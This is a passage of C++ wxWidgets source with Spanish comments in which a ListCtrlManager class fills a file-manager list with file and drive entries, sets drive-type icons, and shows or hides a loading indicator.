				snprintf(cBuf, 19, "%.2f %c", bytes / pow(1024, factor), cDEN[int(factor)]);
				strTama = cBuf;
			}
		}else {
			//unknown
			DEBUG_MSG("[FM]DESCONOCIDO: " + vcEntry);
		}
		
		if (vcFileEntry.size() == 5) {
			int iCount = this->GetItemCount() > 0 ? this->GetItemCount() - 1 : 0;
			if (iCount == -1) { iCount = 0; }

			if (vcFileEntry[1] == "." || vcFileEntry[1] == "..") { continue; }
			
			if (strTama == "-") {
				this->InsertItem(iCount, wxString("-"), 0);
			}else {
				this->InsertItem(iCount, wxString("-"), 1);
			}
			this->SetItem(iCount, 1, wxString(vcFileEntry[1])); //Nombre
			this->SetItem(iCount, 2, strTama);                  //Tamanio
			this->SetItem(iCount, 3, wxString(vcFileEntry[3])); //Fecha modificacion
			this->SetItem(iCount, 4, wxString(vcFileEntry[4])); //Tipo archivo
			
		}else {
			DEBUG_MSG("La entrada no tiene los parametros requeridos: " + vcEntry);
		}

	}
	this->Enable(true);
	this->OcultarCarga();
}

void ListCtrlManager::ListarEquipo(const std::vector<std::string> vcDrives) {
	//Listar discos y almacenamiento
	//5 Columnas para drives
	std::unique_lock<std::mutex> lock(this->mtx_fm);
	
	wxListItem itemCol;
	this->ClearAll();

	itemCol.SetText("");
	itemCol.SetWidth(20);
	itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
	this->InsertColumn(0, itemCol);

	itemCol.SetText("");
	itemCol.SetWidth(30);
	itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
	this->InsertColumn(1, itemCol);

	itemCol.SetText("Nombre");
	itemCol.SetAlign(wxLIST_FORMAT_LEFT);
	itemCol.SetWidth(150);
	this->InsertColumn(2, itemCol);

	itemCol.SetText("Tipo");
	itemCol.SetWidth(100);
	this->InsertColumn(3, itemCol);

	itemCol.SetText("Libre");
	itemCol.SetWidth(50);
	this->InsertColumn(4, itemCol);

	itemCol.SetText("Total");
	itemCol.SetWidth(50);
	this->InsertColumn(5, itemCol);
	
	for (int iCount = 0, iRowCount = 0; iCount<int(vcDrives.size()); iCount++) {
		std::vector<std::string> vDrive = strSplit(vcDrives[iCount], '|', 6);
		//  "C|NTFS|Disco Duro|53.85|249.36"
		if (vDrive.size() >= 6) {
			int image_index = 5;
			if (vDrive[5] == "0") { //Desconocido
				image_index = 3;
			}
			else if (vDrive[5] == "1" || vDrive[5] == "4") { //No montado o remoto
				image_index = 4;
			}
			else if (vDrive[5] == "2") { //USB
				image_index = 7;
			}
			else if (vDrive[5] == "5") { //CDROM
				image_index = 2;
			}
			else if (vDrive[5] == "6") { //RAMDISK
				image_index = 6;
			}
			this->InsertItem(iRowCount, image_index);
			this->SetItem(iRowCount, 1, wxString(vDrive[0]));
			this->SetItem(iRowCount, 2, wxString(vDrive[2]));
			this->SetItem(iRowCount, 3, wxString(vDrive[1]));
			this->SetItem(iRowCount, 4, wxString(vDrive[3]));
			this->SetItem(iRowCount, 5, wxString(vDrive[4]));
			iRowCount++;
		}
	}

	this->Enable(true);
	this->OcultarCarga();
}

void ListCtrlManager::MostrarCarga() {
	std::unique_lock<std::mutex> lock(this->mtx_carga);
	wxSize list_size = this->GetSize();
	wxSize objsize = this->m_indicator->GetSize();
	wxPoint pos((list_size.GetWidth() / 2) - (objsize.GetWidth() /2), (list_size.GetHeight() / 2) - (objsize.GetHeight() / 2));

	this->m_indicator->SetPosition(pos);
	this->m_indicator->Show(true);
	this->m_indicator->Start();
}

void ListCtrlManager::OcultarCarga() {
	std::unique_lock<std::mutex> lock(this->mtx_carga);
	this->m_indicator->Stop();
	this->m_indicator->Show(false);
}

void ListCtrlManager::CargarImagenes() {
	this->img_list = new wxImageList(16, 16);

	wxBitmap newFolder(wxT(".\\imgs\\folder.png"), wxBITMAP_TYPE_PNG);
	wxBitmap newFile(wxT(".\\imgs\\document.png"), wxBITMAP_TYPE_PNG);

	wxBitmap cdImg(wxT(".\\imgs\\cd.png"), wxBITMAP_TYPE_PNG);
	wxBitmap clueImg(wxT(".\\imgs\\clue.png"), wxBITMAP_TYPE_PNG);
	wxBitmap hardDisk(wxT(".\\imgs\\hard-disk.png"), wxBITMAP_TYPE_PNG);
	wxBitmap hardDrive(wxT(".\\imgs\\hard-drive.png"), wxBITMAP_TYPE_PNG);
	wxBitmap ramDrive(wxT(".\\imgs\\ram.png"), wxBITMAP_TYPE_PNG);
	wxBitmap usbDrive(wxT(".\\imgs\\usb-flash-drive.png"), wxBITMAP_TYPE_PNG);

	this->img_list->Add(newFolder);
	this->img_list->Add(newFile);
	this->img_list->Add(cdImg);     //CDROM                            2
	this->img_list->Add(clueImg);   //Desconocido                      3
	this->img_list->Add(hardDrive);  //Volumen no montado o Remoto      4
	this->img_list->Add(hardDisk); //Disco Duro                       5
	this->img_list->Add(ramDrive);  //RAM                              6
	this->img_list->Add(usbDrive);  //USB                              7

	this->AssignImageList(this->img_list, wxIMAGE_LIST_SMALL);
}